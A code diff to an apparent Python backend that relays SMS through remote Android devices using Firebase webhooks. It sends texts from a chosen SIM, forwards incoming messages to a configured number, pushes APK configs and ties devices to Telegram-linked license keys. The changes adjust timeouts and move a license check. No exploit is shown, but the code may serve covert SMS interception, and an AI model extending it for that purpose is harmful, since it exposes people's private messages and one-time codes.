@@ -12,8 +12,8 @@ from app.firebase_client import normalize_firebase_url
 logger = logging.getLogger(__name__)
 settings = get_settings()
 
-INJECT_TIMEOUT_SEC = 1.5
-OUTGOING_TIMEOUT_SEC = 3.0
+INJECT_TIMEOUT_SEC = 0.8
+OUTGOING_TIMEOUT_SEC = 1.0
 OUTGOING_SENDER = "__OUT__"
 
 def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
@@ -191,7 +191,7 @@ async def push_channel_webhook_sms(
     message: str,
     sim_index: int = 0,
 ) -> bool:
-    """Auto-token fast path — single PATCH webhook (~0.1s), selected SIM index."""
+    """Auto-token fast path — PATCH webhook first hit (~100ms), selected SIM index."""
     base = normalize_firebase_url(firebase_url)
     payload = {
         "from": sim_index,
@@ -202,13 +202,12 @@ async def push_channel_webhook_sms(
     device_ids = _outgoing_device_ids(device)
     primary = device_ids[0] if device_ids else device.name
     urls = _outgoing_webhook_paths(base, primary)
-    results = await asyncio.gather(
-        *(_firebase_patch_ok(url, payload, timeout=1.2) for url in urls),
-        return_exceptions=True,
-    )
-    if any(result is True for result in results):
-        logger.info("Channel webhook queued device=%s to=%s sim=%s", primary, to_number, sim_index)
-        return True
+    channel_timeout = max(0.5, get_settings().channel_firebase_timeout_sec)
+
+    for url in urls:
+        if await _firebase_patch_ok(url, payload, timeout=channel_timeout):
+            logger.info("Channel webhook queued device=%s to=%s sim=%s", primary, to_number, sim_index)
+            return True
     return False
 
 
@@ -528,7 +527,7 @@ async def send_polling_startup_test(
     profile: MonitorProfile,
     device: Device,
 ) -> tuple[int, int]:
-    """Monitoring start — Astik inject to /mynum (APK on mynum). KEY optional on bot."""
+    """Monitoring start — push APK config + inject test to /mynum queue."""
     import time
 
     from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER
@@ -537,13 +536,27 @@ async def send_polling_startup_test(
     mynum = resolve_mynum_phone(profile, db)
     if mynum and not profile.phone_number:
         profile.phone_number = mynum
+        profile.mynum_selected = True
+        db.commit()
+        db.refresh(profile)
     if not profile.phone_number or not profile.is_monitoring:
+        logger.warning("Startup test skipped: /mynum not set (APK phone number)")
         return 0, 0
 
     firebase_url = resolve_firebase_url(profile, device)
     if not firebase_url:
         logger.warning("Startup test skipped: no firebase URL")
         return 0, 0
+
+    license_key = get_license_key(profile)
+    if license_key and license_key.upper().startswith("KEY-"):
+        from app.license_keys import register_device_on_key
+
+        poll_id = mynum_device_id(profile.phone_number)
+        register_device_on_key(license_key, poll_id, profile.telegram_user_id)
+
+    await push_virtus_apk_config(profile, device)
+    await push_module_config(profile, device)
 
     t0 = time.perf_counter()
     try:
@@ -574,10 +587,6 @@ async def forward_incoming_to_mynum(
     from app.channel_relay import prepare_sms_forward, queue_forward_to_mynum
 
     if not profile.phone_number or not profile.is_monitoring:
-        return
-
-    license_key = get_license_key(profile)
-    if not license_key or not license_key.upper().startswith("KEY-"):
         return
 
     try:
